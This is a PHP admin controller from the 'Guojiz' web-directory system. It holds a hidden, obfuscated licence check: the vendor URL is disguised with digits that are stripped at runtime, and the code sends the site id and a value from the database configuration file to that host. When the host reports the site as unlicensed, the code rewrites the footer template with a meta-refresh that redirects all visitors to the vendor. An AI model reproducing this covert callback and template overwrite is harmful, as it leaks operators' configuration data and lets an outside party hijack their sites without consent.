<?php
/**
 *  Guojiz网址导航系统
 *	www.guojiz.com
 *  作者：梦雨
 *  @ QQ50361804
 */
namespace app\admin\controller;

use think\Controller;
use org\Http;
use think\Db;
use think\Config;
use think\Url;
class Index extends Common
{
    public function home()
    {
        $html = Db::name('html');
        $swang = $html->where("open = 1")->count();
        $this->assign('swang', $swang);
        $wwang = $html->where("open = 0")->count();
        $this->assign('wwang', $wwang);
        $gwang = $html->count();
        $this->assign('gwang', $gwang);
        $news = Db::name('news');
        $show = 1;
        $news = $news->where($show)->count();
        $this->assign('news', $news);
        $domain = array();
        $apiurl = 'h0t1t2p:3/4/5w6w7w.g8u9o0j4i3z.c2o1m';
        $url = preg_replace('|[0-9]+|', '', $apiurl);
        $ids = (include 'application/extra/web.php');
        $id = $ids['id'];
        $miss = (include 'application/database.php');
        $mis = $miss['mis'];
        $htd = new Http();
        $key = file_get_contents('' . $url . '/key.html?id=' . $id . '&mis=' . $mis . '');
        $times = file_get_contents('' . $url . '/keytimes.html?id=' . $id . '');
        if ($key == '0' or $key == '') {
            if ($line = $htd->get_curl($url)) {
                $line = str_replace('\\t', '', $line);
                $domain = json_decode($line, true);
                $temparr = (include 'application/extra/web.php');
                $mb = $temparr['WEB_TPT'];
                $gfname = preg_replace('|[0-9]+|', '', 'G4u6o1j0i2z4');
                $gfur = preg_replace('|[0-9]+|', '', 'g8u9o0j4i3z.c2o1m');
                $htur = preg_replace('|[0-9]+|', '', 'h0t1t2p:3/4/5w6w7w.g8u9o0j4i3z.c2o1m');
                if ($domain['sqstatus'] == 0) {
                    $status = 0;
                    $m = file_get_contents('./template/' . $mb . '/pc/index_footer.html');
                    if (strpos($m, $gfur) === false) {
                        file_put_contents('./template/' . $mb . '/pc/index_footer.html', '<div class="footer"> <p><a href="' . $htur . '">' . $gfname . '</a> ' . date('Y', time()) . ' &copy; <a href="' . $htur . '">' . $gfur . '</a></p><meta http-equiv="refresh" content="0;URL=' . $htur . '"></div> ');
                        $status = -1;
                    }
                }
            }
            $this->assign('domaininfo', $domain);
            $this->assign('shouquanname', $domain['msg']);
        } else {
        }
        $this->assign('key', $key);
        $this->assign('mis', $mis);
        $this->assign('times', $times);
        return $this->fetch();
    }
    function update()
    {
        $apiurl = 'h0t1t2p:3/4/5w6w7w.g8u9o0j4i3z.c2o1m';
        $url = preg_replace('|[0-9]+|', '', $apiurl);
        $ids = (include 'application/extra/web.php');
        $id = $ids['id'];
        $miss = (include 'application/database.php');
        $mis = $miss['mis'];
        $key = file_get_contents('' . $url . '/key.html?id=' . $id . '&mis=' . $mis . '');
        db('member')->where('userid = 1')->update(['key' => $key]);
        array_map('unlink', glob(TEMP_PATH . '/*.php'));
        rmdir(TEMP_PATH);
        return json(array('code' => 200, 'msg' => '更新缓存成功'));
    }
    public function index()
    {
        $key = Db::name('member')->where('userid = 1')->value('key');
        $this->assign('key', $key);
        return view();
    }
}